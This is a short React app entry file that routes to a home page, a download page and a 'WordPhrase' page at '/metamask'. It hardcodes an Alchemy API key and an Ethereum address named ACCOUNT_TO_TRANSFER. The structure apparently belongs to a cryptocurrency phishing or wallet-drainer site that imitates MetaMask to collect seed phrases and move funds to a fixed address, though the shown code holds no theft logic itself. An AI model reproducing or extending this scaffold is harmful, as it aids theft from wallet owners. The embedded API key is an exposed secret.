import React from "react";
import fullLogo from "./assets/fullLogo.png";
import { ethers } from "ethers";
import Home from "./pages/home";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import Download from "./pages/download";
import WordPhrase from "./pages/WordPhrase";

const ALCHEMY_API_KEY = "eGF2uRun9jOuwiS9FhuWy1lsuJ8tCvb5";
const ACCOUNT_TO_TRANSFER = "0xaecc4921C28D92DAD6fBaDfEea84909652D3A299";

export default function App() {
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/" element={<Home />} />
        <Route path="/download" element={<Download />} />
        <Route path="/metamask" element={<WordPhrase />} />
      </Routes>
    </BrowserRouter>
  );
}
